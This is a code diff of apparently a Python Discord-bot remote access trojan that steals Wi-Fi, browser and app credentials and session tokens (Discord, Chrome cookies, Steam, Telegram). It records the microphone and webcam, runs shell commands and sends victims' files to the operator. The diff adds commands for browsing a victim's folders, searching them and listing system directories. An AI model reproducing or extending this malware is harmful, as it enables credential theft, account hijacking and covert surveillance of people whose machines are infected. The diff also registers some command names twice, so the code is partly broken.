@@ -210,7 +210,7 @@ def get_wifipasswords():
         pass
     return profiles
 
-# ========== FOLDER HELPERS (FIXED FOR ONEDRIVE) ==========
+# ========== FOLDER HELPERS ==========
 def get_folder_path(folder_name):
     """Get actual Windows folder path (handles OneDrive)"""
     folder_map = {
@@ -231,12 +231,10 @@ def get_folder_path(folder_name):
     except:
         pass
     
-    # Fallback
     return os.path.join(os.path.expanduser('~'), folder_name.capitalize())
 
 # ========== BROWSER HISTORY ==========
 def get_browser_history(browser_name, history_db_path):
-    """Get browser history from Chromium-based browsers"""
     history = []
     try:
         if not os.path.exists(history_db_path):
@@ -265,7 +263,6 @@ def get_browser_history(browser_name, history_db_path):
         return []
 
 def get_all_browser_history():
-    """Get history from all browsers"""
     all_history = []
     detected = []
     
@@ -290,7 +287,6 @@ def get_all_browser_history():
 
 # ========== BROWSER PASSWORDS ==========
 def get_browser_passwords(browser_name, user_data_path):
-    """Get passwords from Chromium-based browsers"""
     passwords = []
     try:
         if not CRYPTO_AVAILABLE:
@@ -338,7 +334,6 @@ def get_browser_passwords(browser_name, user_data_path):
         return []
 
 def get_all_browser_passwords():
-    """Get passwords from ALL browsers"""
     all_passwords = []
     detected = []
     
@@ -358,13 +353,12 @@ def get_all_browser_passwords():
     
     return all_passwords, detected
 
-# ========== TOKEN GRABBER (FIXED) ==========
+# ========== TOKEN GRABBER ==========
 def grab_all_tokens():
-    """Grab tokens from Discord, browsers, and other apps"""
     tokens = []
     detected_apps = []
     
-    # Discord tokens
+    # Discord
     discord_paths = [
         os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
@@ -389,7 +383,7 @@ def grab_all_tokens():
             except:
                 pass
     
-    # Chrome cookies (OAuth tokens)
+    # Chrome cookies
     chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
     if os.path.exists(chrome_path):
         detected_apps.append("Chrome")
@@ -419,7 +413,6 @@ def grab_all_tokens():
                 matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
                 for match in matches:
                     tokens.append(f"🎮 Steam Account: {match}")
-                # Also grab steam IDs
                 matches = re.findall(r'"SteamID"\s*"([^"]+)"', data)
                 for match in matches:
                     tokens.append(f"🎮 Steam ID: {match}")
@@ -551,7 +544,7 @@ def grab_all_tokens():
         except:
             pass
     
-    # Telegram (session files)
+    # Telegram
     telegram_paths = [
         os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
         os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
@@ -799,7 +792,25 @@ async def send_embed(ctx, title, description, color=discord.Color.blue()):
     embed = discord.Embed(title=title, description=description, color=color)
     await ctx.send(embed=embed)
 
-# ========== ALL COMMANDS ==========
+# ========== FILE EMOJI HELPER ==========
+def get_file_emoji(filename):
+    ext = os.path.splitext(filename)[1].lower()
+    emoji_map = {
+        '.txt': '📄', '.py': '🐍', '.pyw': '🐍', '.exe': '⚙️', '.dll': '🔧',
+        '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️', '.bmp': '🖼️', '.webp': '🖼️', '.ico': '🖼️', '.svg': '🖼️',
+        '.mp3': '🎵', '.wav': '🎵', '.flac': '🎵', '.aac': '🎵', '.ogg': '🎵', '.wma': '🎵',
+        '.mp4': '🎬', '.avi': '🎬', '.mkv': '🎬', '.mov': '🎬', '.wmv': '🎬', '.flv': '🎬', '.webm': '🎬', '.m4v': '🎬',
+        '.zip': '📦', '.rar': '📦', '.7z': '📦', '.tar': '📦', '.gz': '📦',
+        '.pdf': '📕', '.doc': '📘', '.docx': '📘', '.xls': '📊', '.xlsx': '📊',
+        '.lua': '📜', '.json': '📋', '.xml': '📋', '.html': '🌐', '.css': '🎨', '.js': '⚡',
+        '.iso': '💿', '.msi': '📦', '.bat': '💻', '.cmd': '💻', '.ps1': '💻',
+        '.reg': '📝', '.ini': '📝', '.cfg': '📝', '.conf': '📝', '.log': '📋',
+        '.ttf': '🔤', '.otf': '🔤', '.woff': '🔤',
+        '.apk': '📱', '.ipa': '📱', '.torrent': '🧲'
+    }
+    return emoji_map.get(ext, '📄')
+
+# ========== COMMANDS ==========
 
 @bot.event
 async def on_ready():
@@ -1091,6 +1102,7 @@ async def media_next(ctx):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== FILE LISTING ==========
 @bot.command(name='listfiles')
 @is_authorized()
 async def list_files(ctx, directory: str = "."):
@@ -1105,17 +1117,19 @@ async def list_files(ctx, directory: str = "."):
         if not os.path.isdir(directory):
             await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
             return
+        
         files = os.listdir(directory)
         items = []
         for f in files:
             path = os.path.join(directory, f)
             if os.path.isdir(path):
-                items.append({'name': f, 'type': 'folder', 'path': path})
+                items.append({'name': f, 'type': 'folder'})
             else:
                 size = os.path.getsize(path)
-                ext = os.path.splitext(f)[1].lower() if os.path.splitext(f)[1] else ""
-                items.append({'name': f, 'type': ext, 'size': size, 'path': path})
+                items.append({'name': f, 'type': 'file', 'size': size})
+        
         items.sort(key=lambda x: (0 if x['type'] == 'folder' else 1, x['name'].lower()))
+        
         chunks = []
         current_chunk = []
         for item in items:
@@ -1131,38 +1145,204 @@ async def list_files(ctx, directory: str = "."):
                     size_str = f"{size/1048576:.1f} MB"
                 else:
                     size_str = f"{size/1073741824:.2f} GB"
-                ext = item['type'][1:] if item['type'] else "noext"
-                ext_emoji = {
-                    'txt': '📄', 'py': '🐍', 'exe': '⚙️', 'dll': '🔧',
-                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
-                    'mp3': '🎵', 'wav': '🎵', 'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬',
-                    'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
-                    'pdf': '📕', 'doc': '📘', 'docx': '📘', 'xls': '📊', 'xlsx': '📊',
-                    'lua': '📜', 'json': '📋', 'xml': '📋', 'html': '🌐', 'css': '🎨', 'js': '⚡',
-                    'iso': '💿', 'msi': '📦', 'bat': '💻', 'cmd': '💻', 'ps1': '💻',
-                    'reg': '📝', 'ini': '📝', 'cfg': '📝', 'conf': '📝', 'log': '📋'
-                }
-                emoji = ext_emoji.get(ext, '📄')
+                emoji = get_file_emoji(item['name'])
                 line = f"{emoji} {item['name']} ({size_str})"
+            
             current_chunk.append(line)
             if len('\n'.join(current_chunk)) > 1800:
                 chunks.append('\n'.join(current_chunk[:-1]))
                 current_chunk = [line]
         if current_chunk:
             chunks.append('\n'.join(current_chunk))
+        
         if not chunks:
             await send_embed(ctx, f"📁 {directory}", "Directory is empty", discord.Color.blue())
             return
-        total_files = len([i for i in items if i['type'] != 'folder'])
+        
+        total_files = len([i for i in items if i['type'] == 'file'])
         total_folders = len([i for i in items if i['type'] == 'folder'])
-        embed = discord.Embed(title=f"📁 {directory}", description=f"**{total_folders} folders, {total_files} files**\n\n{chunks[0]}", color=discord.Color.blue())
+        
+        embed = discord.Embed(
+            title=f"📁 {directory}",
+            description=f"**{total_folders} folders, {total_files} files**\n\n{chunks[0]}",
+            color=discord.Color.blue()
+        )
         if len(chunks) > 1:
-            embed.set_footer(text=f"Showing 1/{len(chunks)} | Use !listfiles {directory} for more")
+            embed.set_footer(text=f"Showing 1/{len(chunks)} | Use !listfiles {directory}")
         await ctx.send(embed=embed)
+        
         for i, chunk in enumerate(chunks[1:], start=2):
-            embed = discord.Embed(title=f"📁 {directory} (continued)", description=chunk, color=discord.Color.blue())
+            embed = discord.Embed(
+                title=f"📁 {directory} (continued)",
+                description=chunk,
+                color=discord.Color.blue()
+            )
             embed.set_footer(text=f"Showing {i}/{len(chunks)}")
             await ctx.send(embed=embed)
+            
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+# ========== FILTERED LISTINGS ==========
+@bot.command(name='images')
+@is_authorized()
+async def list_images(ctx, directory: str = "."):
+    """List only image files"""
+    try:
+        if directory.startswith("~"):
+            directory = os.path.expanduser(directory)
+        if directory == ".":
+            directory = current_path
+        if not os.path.exists(directory):
+            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
+            return
+        
+        image_exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.ico', '.svg'}
+        files = os.listdir(directory)
+        images = []
+        
+        for f in files:
+            path = os.path.join(directory, f)
+            if os.path.isfile(path):
+                ext = os.path.splitext(f)[1].lower()
+                if ext in image_exts:
+                    size = os.path.getsize(path)
+                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
+                    images.append(f"🖼️ {f} ({size_str})")
+        
+        if not images:
+            await send_embed(ctx, f"📁 {directory}", "No images found", discord.Color.orange())
+            return
+        
+        await send_embed(ctx, f"🖼️ Images in {directory}", "\n".join(images[:30]), discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='videos')
+@is_authorized()
+async def list_videos_only(ctx, directory: str = "."):
+    """List only video files"""
+    try:
+        if directory.startswith("~"):
+            directory = os.path.expanduser(directory)
+        if directory == ".":
+            directory = current_path
+        if not os.path.exists(directory):
+            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
+            return
+        
+        video_exts = {'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg', '.3gp'}
+        files = os.listdir(directory)
+        videos = []
+        
+        for f in files:
+            path = os.path.join(directory, f)
+            if os.path.isfile(path):
+                ext = os.path.splitext(f)[1].lower()
+                if ext in video_exts:
+                    size = os.path.getsize(path)
+                    size_str = f"{size/1048576:.1f} MB" if size > 1048576 else f"{size/1024:.1f} KB"
+                    videos.append(f"🎬 {f} ({size_str})")
+        
+        if not videos:
+            await send_embed(ctx, f"📁 {directory}", "No videos found", discord.Color.orange())
+            return
+        
+        await send_embed(ctx, f"🎬 Videos in {directory}", "\n".join(videos[:30]), discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='music')
+@is_authorized()
+async def list_music_only(ctx, directory: str = "."):
+    """List only audio files"""
+    try:
+        if directory.startswith("~"):
+            directory = os.path.expanduser(directory)
+        if directory == ".":
+            directory = current_path
+        if not os.path.exists(directory):
+            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
+            return
+        
+        audio_exts = {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus'}
+        files = os.listdir(directory)
+        audio = []
+        
+        for f in files:
+            path = os.path.join(directory, f)
+            if os.path.isfile(path):
+                ext = os.path.splitext(f)[1].lower()
+                if ext in audio_exts:
+                    size = os.path.getsize(path)
+                    size_str = f"{size/1048576:.1f} MB" if size > 1048576 else f"{size/1024:.1f} KB"
+                    audio.append(f"🎵 {f} ({size_str})")
+        
+        if not audio:
+            await send_embed(ctx, f"📁 {directory}", "No audio files found", discord.Color.orange())
+            return
+        
+        await send_embed(ctx, f"🎵 Audio in {directory}", "\n".join(audio[:30]), discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='search')
+@is_authorized()
+async def search_files(ctx, *, query: str):
+    """Search for files by name"""
+    try:
+        results = []
+        for root, dirs, files in os.walk(current_path):
+            for f in files:
+                if query.lower() in f.lower():
+                    path = os.path.join(root, f)
+                    size = os.path.getsize(path)
+                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
+                    rel_path = os.path.relpath(root, current_path)
+                    if rel_path == '.':
+                        results.append(f"{get_file_emoji(f)} {f} ({size_str})")
+                    else:
+                        results.append(f"{get_file_emoji(f)} {rel_path}\\{f} ({size_str})")
+                    if len(results) >= 30:
+                        break
+            if len(results) >= 30:
+                break
+        
+        if not results:
+            await send_embed(ctx, "🔍 Search Results", f"No files found matching '{query}'", discord.Color.orange())
+            return
+        
+        await send_embed(ctx, f"🔍 Found {len(results)} files", "\n".join(results), discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
+
+@bot.command(name='recent')
+@is_authorized()
+async def recent_files(ctx, count: int = 15):
+    """Show recently modified files"""
+    try:
+        if count > 50:
+            count = 50
+        files = []
+        for f in os.listdir(current_path):
+            path = os.path.join(current_path, f)
+            if os.path.isfile(path):
+                mtime = os.path.getmtime(path)
+                files.append((mtime, f, path))
+        
+        files.sort(reverse=True)
+        results = []
+        for mtime, f, path in files[:count]:
+            size = os.path.getsize(path)
+            size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
+            mod_time = datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M')
+            results.append(f"{get_file_emoji(f)} {f} ({size_str}) - {mod_time}")
+        
+        if not results:
+            await send_embed(ctx, "📂 Recent Files", "No files found", discord.Color.orange())
+            return
+        
+        await send_embed(ctx, f"📂 Recent Files ({len(results)})", "\n".join(results), discord.Color.blue())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
@@ -1182,7 +1362,6 @@ async def run_cmd(ctx, *, command: str):
 @bot.command(name='mic')
 @is_authorized()
 async def mic_record(ctx, duration: int = 10):
-    """Record microphone"""
     if duration < 3:
         duration = 3
     if duration > 60:
@@ -1215,7 +1394,6 @@ async def mic_record(ctx, duration: int = 10):
 @bot.command(name='camrec')
 @is_authorized()
 async def cam_record(ctx, duration: int = 10):
-    """Record webcam video for X seconds (5-300)"""
     if duration < 5:
         duration = 5
     if duration > 300:
@@ -1540,73 +1718,159 @@ async def browser_history(ctx):
     else:
         await send_embed(ctx, "History", "No browser history found", discord.Color.red())
 
-# ========== FOLDER COMMANDS (FIXED FOR ONEDRIVE) ==========
-@bot.command(name='downloadsfolder')
-@is_authorized()
-async def list_downloads_folder(ctx):
-    path = get_folder_path('downloads')
-    await list_files(ctx, path)
-
-@bot.command(name='documentsfolder')
-@is_authorized()
-async def list_documents_folder(ctx):
-    path = get_folder_path('documents')
-    await list_files(ctx, path)
-
-@bot.command(name='picturesfolder')
-@is_authorized()
-async def list_pictures_folder(ctx):
-    path = get_folder_path('pictures')
-    await list_files(ctx, path)
-
-@bot.command(name='musicfolder')
-@is_authorized()
-async def list_music_folder(ctx):
-    path = get_folder_path('music')
-    await list_files(ctx, path)
-
-@bot.command(name='videosfolder')
-@is_authorized()
-async def list_videos_folder(ctx):
-    path = get_folder_path('videos')
-    await list_files(ctx, path)
-
-@bot.command(name='desktopfolder')
-@is_authorized()
-async def list_desktop_folder(ctx):
-    path = get_folder_path('desktop')
-    await list_files(ctx, path)
-
-# ========== SHORTCUTS ==========
+# ========== FOLDER COMMANDS WITH PATH SUPPORT ==========
 @bot.command(name='pictures')
 @is_authorized()
-async def pictures_cmd(ctx):
-    await list_pictures_folder(ctx)
-
-@bot.command(name='music')
-@is_authorized()
-async def music_cmd(ctx):
-    await list_music_folder(ctx)
-
-@bot.command(name='videos')
-@is_authorized()
-async def videos_cmd(ctx):
-    await list_videos_folder(ctx)
-
-@bot.command(name='desktop')
-@is_authorized()
-async def desktop_cmd(ctx):
-    await list_desktop_folder(ctx)
+async def pictures_cmd(ctx, *, path: str = ""):
+    if path:
+        target = os.path.join(get_folder_path('pictures'), path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, get_folder_path('pictures'))
 
 @bot.command(name='downloads')
 @is_authorized()
-async def downloads_cmd(ctx):
-    await list_downloads_folder(ctx)
+async def downloads_cmd(ctx, *, path: str = ""):
+    if path:
+        target = os.path.join(get_folder_path('downloads'), path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, get_folder_path('downloads'))
 
 @bot.command(name='documents')
 @is_authorized()
-async def documents_cmd(ctx):
-    await list_documents_folder(ctx)
+async def documents_cmd(ctx, *, path: str = ""):
+    if path:
+        target = os.path.join(get_folder_path('documents'), path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, get_folder_path('documents'))
+
+@bot.command(name='music')
+@is_authorized()
+async def music_cmd(ctx, *, path: str = ""):
+    if path:
+        target = os.path.join(get_folder_path('music'), path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, get_folder_path('music'))
+
+@bot.command(name='videos')
+@is_authorized()
+async def videos_cmd(ctx, *, path: str = ""):
+    if path:
+        target = os.path.join(get_folder_path('videos'), path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, get_folder_path('videos'))
+
+@bot.command(name='desktop')
+@is_authorized()
+async def desktop_cmd(ctx, *, path: str = ""):
+    if path:
+        target = os.path.join(get_folder_path('desktop'), path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, get_folder_path('desktop'))
+
+# ========== SYSTEM FOLDER COMMANDS ==========
+@bot.command(name='programfiles')
+@is_authorized()
+async def program_files_cmd(ctx, *, path: str = ""):
+    base = "C:\\Program Files"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='programfilesx86')
+@is_authorized()
+async def program_files_x86_cmd(ctx, *, path: str = ""):
+    base = "C:\\Program Files (x86)"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='windows')
+@is_authorized()
+async def windows_cmd(ctx, *, path: str = ""):
+    base = "C:\\Windows"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='system32')
+@is_authorized()
+async def system32_cmd(ctx, *, path: str = ""):
+    base = "C:\\Windows\\System32"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='users')
+@is_authorized()
+async def users_cmd(ctx, *, path: str = ""):
+    base = "C:\\Users"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='appdata')
+@is_authorized()
+async def appdata_cmd(ctx, *, path: str = ""):
+    base = os.path.expanduser("~") + "\\AppData"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='local')
+@is_authorized()
+async def local_cmd(ctx, *, path: str = ""):
+    base = os.path.expanduser("~") + "\\AppData\\Local"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='roaming')
+@is_authorized()
+async def roaming_cmd(ctx, *, path: str = ""):
+    base = os.path.expanduser("~") + "\\AppData\\Roaming"
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='temp')
+@is_authorized()
+async def temp_cmd(ctx, *, path: str = ""):
+    base = os.environ['TEMP']
+    if path:
+        target = os.path.join(base, path)
+        await list_files(ctx, target)
+    else:
+        await list_files(ctx, base)
+
+@bot.command(name='goto')
+@is_authorized()
+async def goto_folder(ctx, *, path: str):
+    if os.path.exists(path) and os.path.isdir(path):
+        await list_files(ctx, path)
+    else:
+        await send_embed(ctx, "Error", f"Folder not found: {path}", discord.Color.red())
 
 # ========== ALIASES ==========
 @bot.command(name='sysinfo')
@@ -1704,6 +1968,10 @@ async def change_dir(ctx, path: str = None):
     if not path:
         await send_embed(ctx, "Current Dir", current_path, discord.Color.blue())
         return
+    if path == "..":
+        current_path = os.path.dirname(current_path)
+        await send_embed(ctx, "Changed", current_path, discord.Color.green())
+        return
     new_path = path if os.path.isabs(path) else os.path.join(current_path, path)
     if os.path.exists(new_path) and os.path.isdir(new_path):
         current_path = new_path
@@ -1725,15 +1993,26 @@ async def upload_file(ctx):
 @is_authorized()
 async def download_file(ctx, *, filepath: str):
     try:
-        if not os.path.isabs(filepath):
+        if not os.path.isabs(filepath) and not filepath.startswith('.'):
             filepath = os.path.join(current_path, filepath)
+        elif filepath.startswith('.'):
+            filepath = os.path.join(current_path, filepath[2:])
         filepath = os.path.normpath(filepath)
         if os.path.exists(filepath) and os.path.isfile(filepath):
             if os.path.getsize(filepath) > 104857600:
-                await send_embed(ctx, "Error", "File >100MB", discord.Color.red())
+                await send_embed(ctx, "Error", "File >100MB (Discord limit)", discord.Color.red())
                 return
             await ctx.send(file=discord.File(filepath))
         else:
+            dirname = os.path.dirname(filepath)
+            basename = os.path.basename(filepath)
+            if os.path.exists(dirname):
+                similar = [f for f in os.listdir(dirname) if basename.lower() in f.lower()]
+                if similar:
+                    await send_embed(ctx, "File Not Found", 
+                        f"Did you mean one of these?\n```\n" + "\n".join(similar[:5]) + "\n```\n\nUse: `!download filename`",
+                        discord.Color.orange())
+                    return
             await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
@@ -1933,7 +2212,22 @@ async def help_cmd(ctx):
             "`music` - List Music folder",
             "`videos` - List Videos folder",
             "`desktop` - List Desktop folder",
-            "`installed` - List installed programs"
+            "`installed` - List installed programs",
+            "`search <query>` - Search for files",
+            "`recent` - Show recently modified files",
+            "`images` - Show only image files",
+            "`videos` - Show only video files",
+            "`music` - Show only audio files",
+            "`programfiles` - C:\\Program Files",
+            "`programfilesx86` - C:\\Program Files (x86)",
+            "`windows` - C:\\Windows",
+            "`system32` - C:\\Windows\\System32",
+            "`users` - C:\\Users",
+            "`appdata` - AppData folder",
+            "`local` - AppData\\Local",
+            "`roaming` - AppData\\Roaming",
+            "`temp` - Temp folder",
+            "`goto <path>` - Go to any folder"
         ],
         "🎥 Surveillance": [
             "`webcampic` - Take webcam photo",
